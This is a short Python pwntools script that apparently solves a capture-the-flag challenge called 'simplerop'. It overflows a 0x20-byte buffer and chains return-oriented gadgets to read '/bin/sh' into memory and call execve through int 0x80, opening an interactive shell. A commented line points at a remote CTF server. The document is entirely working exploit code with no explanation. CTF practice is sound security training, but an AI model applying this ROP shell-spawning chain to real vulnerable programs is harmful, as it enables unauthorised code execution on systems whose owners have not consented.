
from pwn import*
elf=ELF('./simplerop')
#p=remote('node4.buuoj.cn',27752)
p=process('./simplerop')
context.log_level='debug'

bss=0x80ec304
read=0x806cd50
pop_eax=0x80bae06
pop_edx_ecx_ebx=0x806e850
int_80=0x80493e1

payload=b'a'*(0x20)+p32(read)+p32(pop_edx_ecx_ebx)+p32(0)+p32(bss)+p32(8)+p32(pop_eax)+p32(0xb)+p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(bss)+p32(int_80)
p.sendafter(b"Your input :",payload)
p.send(b'/bin/sh\x00')
p.interactive()


